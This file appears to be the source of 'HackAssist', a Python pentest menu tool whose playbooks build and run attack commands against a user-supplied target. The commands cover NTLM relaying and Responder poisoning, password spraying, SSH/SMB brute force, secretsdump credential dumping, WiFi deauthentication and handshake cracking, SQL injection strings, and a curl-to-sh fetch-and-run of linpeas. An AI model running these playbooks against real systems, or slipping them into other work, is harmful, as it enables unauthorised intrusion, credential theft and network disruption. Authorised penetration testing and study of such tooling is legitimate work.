#!/usr/bin/env python3
"""HackAssist - Attack Playbooks for common scenarios."""

import os
import json
from datetime import datetime

from ui import console, show_menu, ask, info, success, warning, error
from executor import run_with_preview

PLAYBOOKS = {
    'Web Application': {
        'desc': 'Full web app pentest workflow',
        'steps': [
            {'name': 'Recon - Subdomain enum', 'cmd': 'subfinder -d {target} -silent'},
            {'name': 'Recon - Tech detection', 'cmd': 'whatweb {target}'},
            {'name': 'Scanning - Port scan', 'cmd': 'nmap -sV -sC -T4 {target}'},
            {'name': 'Enum - Directory brute', 'cmd': 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt'},
            {'name': 'Enum - Nikto scan', 'cmd': 'nikto -h {target}'},
            {'name': 'Vuln - SQLi test', 'cmd': 'sqlmap -u "http://{target}" --batch --crawl=2'},
            {'name': 'Vuln - XSS scan', 'cmd': 'dalfox url http://{target} --blind your.xss.ht'},
            {'name': 'Vuln - SSL check', 'cmd': 'sslscan {target}'},
        ]
    },
    'Internal Network': {
        'desc': 'Internal network pentest playbook',
        'steps': [
            {'name': 'Discovery - Host scan', 'cmd': 'nmap -sn {target}/24'},
            {'name': 'Scanning - Service scan', 'cmd': 'nmap -sV -sC -T4 {target}/24'},
            {'name': 'Enum - SMB shares', 'cmd': 'crackmapexec smb {target}/24 --shares'},
            {'name': 'Enum - SNMP walk', 'cmd': 'snmpwalk -v2c -c public {target}'},
            {'name': 'Attack - Responder', 'cmd': 'responder -I eth0 -rdw'},
            {'name': 'Attack - SMB relay', 'cmd': 'impacket-ntlmrelayx -tf targets.txt -smb2support'},
            {'name': 'Cred - Password spray', 'cmd': 'crackmapexec smb {target} -u users.txt -p passwords.txt'},
            {'name': 'Post - Secret dump', 'cmd': 'impacket-secretsdump {target}'},
        ]
    },
    'Linux Server': {
        'desc': 'Linux server exploitation playbook',
        'steps': [
            {'name': 'Scan ports', 'cmd': 'nmap -sV -sC -p- -T4 {target}'},
            {'name': 'Enum SSH', 'cmd': 'ssh-audit {target}'},
            {'name': 'Enum HTTP', 'cmd': 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt'},
            {'name': 'Brute SSH', 'cmd': 'hydra -L users.txt -P passwords.txt ssh://{target}'},
            {'name': 'Check exploits', 'cmd': 'searchsploit linux kernel'},
            {'name': 'Post - LinPEAS', 'cmd': 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'},
            {'name': 'Post - SUID', 'cmd': 'find / -perm -4000 -type f 2>/dev/null'},
        ]
    },
    'Windows Server': {
        'desc': 'Windows server exploitation playbook',
        'steps': [
            {'name': 'Scan ports', 'cmd': 'nmap -sV -sC -p- -T4 {target}'},
            {'name': 'Enum SMB', 'cmd': 'enum4linux -a {target}'},
            {'name': 'Enum RPC', 'cmd': "rpcclient -U '' -N {target}"},
            {'name': 'Check EternalBlue', 'cmd': 'nmap --script smb-vuln-ms17-010 -p445 {target}'},
            {'name': 'Brute SMB', 'cmd': 'crackmapexec smb {target} -u admin -p passwords.txt'},
            {'name': 'Evil-WinRM', 'cmd': 'evil-winrm -i {target} -u admin -p password'},
            {'name': 'Post - WinPEAS', 'cmd': 'winpeas.exe'},
        ]
    },
    'WiFi Network': {
        'desc': 'WiFi penetration testing playbook',
        'steps': [
            {'name': 'Scan networks', 'cmd': 'airodump-ng wlan0mon'},
            {'name': 'Target network', 'cmd': 'airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon'},
            {'name': 'Deauth clients', 'cmd': 'aireplay-ng -0 10 -a {bssid} wlan0mon'},
            {'name': 'Crack handshake', 'cmd': 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap'},
        ]
    },
    'API Testing': {
        'desc': 'REST API security testing playbook',
        'steps': [
            {'name': 'Discovery', 'cmd': 'curl -s http://{target}/api/ | python3 -m json.tool'},
            {'name': 'Auth bypass', 'cmd': 'curl -s -H "X-Forwarded-For: 127.0.0.1" http://{target}/api/admin'},
            {'name': 'IDOR test', 'cmd': 'curl -s http://{target}/api/users/1'},
            {'name': 'SQLi test', 'cmd': "curl -s \"http://{target}/api/search?q=' OR 1=1--\""},
            {'name': 'Rate limit', 'cmd': 'for i in $(seq 1 100); do curl -s -o /dev/null -w "%{{http_code}}" http://{target}/api/login; done'},
            {'name': 'Method fuzzing', 'cmd': 'curl -s -X PUT http://{target}/api/users/1'},
        ]
    },
}

CUSTOM_PLAYBOOK_DIR = os.path.expanduser("~/hackassist_playbooks")


def _run_playbook(name, playbook, session):
    target = session['target'] if session else ask("Target")
    console.print(f"\n[bold cyan]{name}[/bold cyan] - {playbook['desc']}\n")

    from rich.table import Table
    table = Table(border_style="cyan")
    table.add_column("#", width=4)
    table.add_column("Step", style="cyan")
    table.add_column("Command", style="dim")

    for i, step in enumerate(playbook['steps'], 1):
        table.add_row(str(i), step['name'], step['cmd'].replace('{target}', target)[:60])
    console.print(table)

    options = [
        ("a", "Run ALL steps sequentially"),
        ("s", "Select specific step"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "a":
        for step in playbook['steps']:
            cmd = step['cmd'].replace('{target}', target)
            console.print(f"\n[bold]Step: {step['name']}[/bold]")
            run_with_preview(cmd, session=session, stage="playbook")
    elif choice == "s":
        step_num = ask("Step number")
        try:
            idx = int(step_num) - 1
            step = playbook['steps'][idx]
            cmd = step['cmd'].replace('{target}', target)
            if '{bssid}' in cmd:
                cmd = cmd.replace('{bssid}', ask("BSSID"))
            if '{channel}' in cmd:
                cmd = cmd.replace('{channel}', ask("Channel"))
            run_with_preview(cmd, session=session, stage="playbook")
        except (ValueError, IndexError):
            error("Invalid step number.")


def _create_custom():
    os.makedirs(CUSTOM_PLAYBOOK_DIR, exist_ok=True)
    name = ask("Playbook name")
    desc = ask("Description")
    steps = []
    info("Add steps (empty name to finish):")
    while True:
        step_name = ask(f"  Step {len(steps)+1} name")
        if not step_name:
            break
        step_cmd = ask(f"  Step {len(steps)+1} command")
        steps.append({'name': step_name, 'cmd': step_cmd})

    if not steps:
        warning("No steps added.")
        return

    playbook = {'desc': desc, 'steps': steps}
    filepath = os.path.join(CUSTOM_PLAYBOOK_DIR, f"{name.lower().replace(' ', '_')}.json")
    with open(filepath, 'w') as f:
        json.dump(playbook, f, indent=2)
    success(f"Playbook saved: {filepath}")


def run(session):
    """Playbooks module entry point."""
    while True:
        console.print("\n[bold green]ATTACK PLAYBOOKS[/bold green]\n")
        options = [(str(i), f"{name} - {pb['desc']}") for i, (name, pb) in enumerate(PLAYBOOKS.items(), 1)]
        options.append(("c", "Create Custom Playbook"))
        options.append(("0", "Back to Main Menu"))
        choice = show_menu(options)

        if choice == "0":
            break
        elif choice == "c":
            _create_custom()
        else:
            try:
                idx = int(choice) - 1
                name = list(PLAYBOOKS.keys())[idx]
                _run_playbook(name, PLAYBOOKS[name], session)
            except (ValueError, IndexError):
                pass
